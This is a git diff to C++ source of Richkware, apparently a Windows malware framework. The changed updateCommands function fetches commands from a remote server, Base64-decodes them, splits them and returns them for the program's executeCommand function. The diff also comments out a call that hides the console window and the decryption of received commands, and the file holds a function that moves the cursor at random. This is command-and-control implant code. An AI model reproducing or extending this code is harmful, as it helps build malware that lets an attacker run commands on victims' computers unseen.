@@ -91,18 +91,25 @@ void Richkware::RandMouse() {
     SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
 }
 
-std::vector<std::string> Richkware::updateCommands(const char *serverAddress, const char *port, const char *associatedUser, std::string remainingCommands) {
-    //TODO: encrypt command list before sending it to server
-    std::string commands = network.fetchCommand(serverAddress, port, associatedUser, remainingCommands);
+std::vector<std::string> Richkware::updateCommands(const char *serverAddress, const char *port, std::string remainingCommands) {
+    //TODO: gestire i remainingCommands
+    std::string commands = network.fetchCommand(serverAddress, port, remainingCommands);
+    std::string decodedCommands = Base64_decode(commands);
+    std::vector<std::string> commandList;
+    std::vector<std::string> result;
     //decrypt string
-    Crypto crypto(encryptionKey);
-    if (!commands.empty()) {
-        std::string decryptedCommands = crypto.Decrypt(commands);
-        std::vector<std::string> commandList = utils::split(commands, "##");
-//        for (size_t i = 0; i < commandList.size(); ++i) {
-//        }
-        return commandList;
+//    Crypto crypto(encryptionKey);
+//    if (!commands.empty()) {
+//        std::string decryptedCommands = crypto.Decrypt(commands);
+    commandList = utils::split(decodedCommands, "##");
+//        return commandList;
+//    }
+    //decode single commands
+    for (size_t i = 0; i < commandList.size(); ++i) {
+        std::string temp = Base64_decode(commandList.at(i));
+        result.push_back(temp);
     }
+    return result;
 }
 
 std::string Richkware::executeCommand(std::string command) {
@@ -158,7 +165,7 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 Richkware::Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress,
                      const char *port, const char *associatedUser) {
     appName = AppNameArg;
-    ShowWindow(GetConsoleWindow(), 0);
+//    ShowWindow(GetConsoleWindow(), 0);
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
